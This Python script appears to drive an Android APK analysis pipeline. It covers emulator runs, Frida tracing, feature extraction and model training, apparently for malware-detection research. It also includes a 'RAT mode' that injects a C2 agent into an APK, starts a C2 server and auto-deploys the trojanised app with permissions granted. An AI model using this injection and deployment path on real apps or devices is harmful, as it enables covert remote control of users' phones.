#!/usr/bin/env python3
"""Unified end-to-end pipeline for android-instrumentor (Genymotion-first)."""
from __future__ import annotations

import argparse
import json
import os
import shutil
import subprocess
import sys
import time
from pathlib import Path

from common_config import ROOT, ensure_dirs, load_config


def run(cmd: list[str], log_path: Path, check: bool = True, env: dict | None = None) -> int:
    log_path.parent.mkdir(parents=True, exist_ok=True)
    print(f"[*] {' '.join(cmd)}")
    with open(log_path, "w", encoding="utf-8") as log:
        proc = subprocess.run(
            cmd,
            stdout=log,
            stderr=subprocess.STDOUT,
            text=True,
            env=env or os.environ.copy(),
            cwd=str(ROOT),
        )
    if check and proc.returncode != 0:
        print(f"[!] Command failed ({proc.returncode}). See {log_path}")
        # print tail for operator
        try:
            lines = log_path.read_text(encoding="utf-8", errors="replace").splitlines()
            for line in lines[-40:]:
                print("    " + line)
        except Exception:
            pass
        raise SystemExit(proc.returncode)
    return proc.returncode


def find_instrumented_apk(output_dir: Path, source_apk: Path) -> Path:
    candidates = [
        output_dir / f"instrumented-{source_apk.name}",
        output_dir / source_apk.name,
        output_dir / f"instrumented-{source_apk.stem}-signed.apk",
    ]
    for c in candidates:
        if c.is_file():
            return c
    # newest apk in dir
    apks = sorted(output_dir.glob("*.apk"), key=lambda p: p.stat().st_mtime, reverse=True)
    if apks:
        return apks[0]
    raise FileNotFoundError(f"No instrumented APK found in {output_dir}")


def _port_available(host: str, port: int) -> bool:
    import socket
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.bind((host, port))
            return True
        except OSError:
            return False


def start_c2(cfg: dict, result_root: Path) -> subprocess.Popen | None:
    import socket
    host = str(cfg.get("c2", {}).get("host", "0.0.0.0"))
    port = int(cfg.get("c2", {}).get("port", 5000))
    db = result_root / "c2_data.db"
    log = result_root / "c2_server.log"

    # Find an available port starting from configured one
    for attempt in range(10):
        try_port = port + attempt
        if _port_available("0.0.0.0", try_port):
            port = try_port
            break
    else:
        print(f"[!] C2 ports {port}-{port+9} all in use, skipping C2")
        return None

    cmd = [
        sys.executable, str(ROOT / "c2_server.py"),
        "--host", host, "--port", str(port), "--db", str(db),
    ]
    print(f"[*] Starting C2 on {host}:{port}")
    fh = open(log, "w", encoding="utf-8")
    proc = subprocess.Popen(cmd, stdout=fh, stderr=subprocess.STDOUT, cwd=str(ROOT))
    proc._log_fh = fh  # type: ignore[attr-defined]
    time.sleep(1.5)
    if proc.poll() is not None:
        print(f"[!] C2 failed to start; see {log}")
        return None
    return proc


def stop_c2(proc: subprocess.Popen | None):
    if not proc:
        return
    try:
        proc.terminate()
        proc.wait(timeout=5)
    except Exception:
        try:
            proc.kill()
        except Exception:
            pass
    fh = getattr(proc, "_log_fh", None)
    if fh:
        try:
            fh.close()
        except Exception:
            pass


def main():
    parser = argparse.ArgumentParser(description="Android Instrumentor full pipeline")
    parser.add_argument("apk", help="Input APK path")
    parser.add_argument("--config", default=str(ROOT / "config.yaml"))
    parser.add_argument("--skip-instrument", action="store_true",
                        help="Use APK as already-instrumented")
    parser.add_argument("--skip-c2", action="store_true")
    parser.add_argument("--skip-train", action="store_true")
    parser.add_argument("--label", default="unknown", help="Sample label for features")
    parser.add_argument("--no-frida", action="store_true")
    parser.add_argument("--stop-emulator", action="store_true")
    parser.add_argument("--serial", default="", help="ADB serial override")
    parser.add_argument("--rat", action="store_true",
                        help="Enable RAT mode: inject C2 agent into APK")
    parser.add_argument("--c2-host", default="127.0.0.1",
                        help="C2 host for RAT mode (default: 127.0.0.1)")
    parser.add_argument("--c2-port", type=int, default=8080,
                        help="C2 port for RAT mode (default: 8080)")
    parser.add_argument("--deploy", action="store_true",
                        help="Auto-deploy to device after build (requires --serial)")
    args = parser.parse_args()

    ensure_dirs()
    cfg = load_config(args.config)
    apk = Path(args.apk).expanduser().resolve()
    if not apk.is_file():
        print(f"[!] APK not found: {apk}")
        sys.exit(2)

    result_root = ROOT / "results" / apk.name
    instrument_dir = result_root / "instrumented"
    traces_dir = result_root / "traces"
    result_root.mkdir(parents=True, exist_ok=True)
    instrument_dir.mkdir(parents=True, exist_ok=True)
    traces_dir.mkdir(parents=True, exist_ok=True)

    meta = {
        "apk": str(apk),
        "started": time.time(),
        "stages": {},
        "rat": args.rat,
        "c2_host": args.c2_host if args.rat else None,
        "c2_port": args.c2_port if args.rat else None,
    }

    # Preflight
    preflight_json = result_root / "preflight.json"
    rc = run(
        [sys.executable, str(ROOT / "pre_flight_check.py"), "--json"],
        preflight_json if False else result_root / "preflight_run.log",
        check=False,
    )
    # write actual json
    subprocess.run(
        [sys.executable, str(ROOT / "pre_flight_check.py"), "--json"],
        stdout=open(preflight_json, "w"),
        cwd=str(ROOT),
    )
    subprocess.run(
        [sys.executable, str(ROOT / "pre_flight_check.py")],
        stdout=open(result_root / "preflight.txt", "w"),
        stderr=subprocess.STDOUT,
        cwd=str(ROOT),
    )
    try:
        pf = json.loads(preflight_json.read_text())
        critical_ok = all([
            pf.get("apktool", {}).get("ok"),
            pf.get("adb", {}).get("ok"),
            pf.get("genymotion", {}).get("ok") or pf.get("emulator", {}).get("ok"),
        ])
        meta["stages"]["preflight"] = {"ok": critical_ok, "rc": rc}
        if not critical_ok:
            print("[!] Preflight failed critical checks. Fix environment first.")
            print(json.dumps(pf, indent=2)[:2000])
            sys.exit(1)
    except Exception as e:
        print(f"[!] Could not parse preflight: {e}")
        sys.exit(1)

    c2_proc = None
    try:
        if not args.skip_c2:
            c2_proc = start_c2(cfg, result_root)

        # Instrument
        if args.skip_instrument:
            instrumented = apk
            shutil.copy2(apk, instrument_dir / apk.name)
        else:
            inst_cmd = [
                sys.executable, str(ROOT / "instrument.py"),
                str(apk), "-o", str(instrument_dir), "-v",
            ]
            if args.rat:
                inst_cmd.extend([
                    "--rat", "--c2-host", args.c2_host, "--c2-port", str(args.c2_port),
                ])
            run(
                inst_cmd,
                result_root / "instrument.log",
                check=True,
            )
            instrumented = find_instrumented_apk(instrument_dir, apk)
        meta["stages"]["instrument"] = {"apk": str(instrumented), "rat": args.rat}
        print(f"[+] Instrumented APK: {instrumented}")

        # Auto-deploy for RAT mode
        if args.rat and args.deploy and args.serial:
            print(f"[*] Auto-deploying RAT APK to {args.serial}...")
            deploy_cmd = [
                "bash", str(ROOT / "deploy_apk.sh"),
                str(instrumented), "--serial", args.serial, "--grant-perms",
            ]
            run(deploy_cmd, result_root / "deploy.log", check=False)
            meta["stages"]["deploy"] = {"serial": args.serial}

        # Orchestrate on Genymotion
        orch_cmd = [
            sys.executable, str(ROOT / "orchestrator.py"),
            str(instrumented),
            "--backend", str(cfg.get("emulator", {}).get("backend", "genymotion")),
            "--vm", str(cfg.get("emulator", {}).get("vm_name", "Genymotion Phone")),
            "--output", str(traces_dir),
            "--timeout", str(cfg.get("analysis", {}).get("timeout", 300)),
            "--gmtool", os.path.expanduser(str(cfg.get("paths", {}).get(
                "gmtool", "~/Documents/Tools/genymotion/gmtool"
            ))),
            "--genymotion-path", os.path.expanduser(str(cfg.get("paths", {}).get(
                "genymotion", "~/Documents/Tools/genymotion"
            ))),
        ]
        serial = args.serial or cfg.get("emulator", {}).get("serial") or ""
        if serial:
            orch_cmd.extend(["--serial", str(serial)])
        if args.no_frida:
            orch_cmd.append("--no-frida")
        if args.stop_emulator:
            orch_cmd.append("--stop-emulator")

        orch_rc = run(orch_cmd, result_root / "orchestrator.log", check=False)
        meta["stages"]["orchestrator"] = {"rc": orch_rc}

        # Feature extraction inputs
        db_path = traces_dir / "instrumentation.db"
        latest_trace = traces_dir / "latest_trace.json"
        inputs = []
        if db_path.is_file() and db_path.stat().st_size > 0:
            inputs.append(str(db_path))
        # also convert frida if db missing
        if (not db_path.is_file() or db_path.stat().st_size == 0):
            for candidate in (
                traces_dir / "frida_events.jsonl",
                traces_dir / "frida_events_from_console.jsonl",
                traces_dir / "frida.log",
            ):
                if candidate.is_file() and candidate.stat().st_size > 0:
                    run(
                        [
                            sys.executable, str(ROOT / "frida_to_db.py"),
                            str(candidate), "-o", str(db_path),
                        ],
                        result_root / "frida_to_db.log",
                        check=False,
                    )
                    if db_path.is_file():
                        inputs.append(str(db_path))
                    break
        if latest_trace.is_file():
            inputs.append(str(latest_trace))
        else:
            traces = sorted(traces_dir.glob("trace_*.json"), key=lambda p: p.stat().st_mtime)
            if traces:
                inputs.append(str(traces[-1]))

        features_out = result_root / "features.json"
        if inputs:
            sample_id = db_path.stem if db_path.is_file() else apk.stem
            run(
                [
                    sys.executable, str(ROOT / "feature_extractor.py"),
                    *inputs,
                    "-o", str(features_out),
                    "--labels", f"{sample_id}:{args.label}",
                ],
                result_root / "feature_extractor.log",
                check=False,
            )
            meta["stages"]["features"] = {"path": str(features_out), "inputs": inputs}
        else:
            print("[!] No traces/DB produced; skipping feature extraction")
            meta["stages"]["features"] = {"ok": False}

        # Optional model train (RandomForest path — reliable without TF)
        if not args.skip_train and features_out.is_file():
            model_out = result_root / "model_rf.pkl"
            run(
                [
                    sys.executable, str(ROOT / "train_simple.py"),
                    "--features", str(features_out),
                    "--output", str(model_out),
                    "--allow-synth-augment",
                ],
                result_root / "train.log",
                check=False,
            )
            meta["stages"]["train"] = {"model": str(model_out)}

        meta["finished"] = time.time()
        meta["duration"] = meta["finished"] - meta["started"]
        (result_root / "pipeline_meta.json").write_text(json.dumps(meta, indent=2))
        print(f"\n[+] Pipeline complete → {result_root}")
        print(json.dumps(meta["stages"], indent=2))
        if orch_rc != 0:
            sys.exit(orch_rc)
    finally:
        stop_c2(c2_proc)


if __name__ == "__main__":
    main()
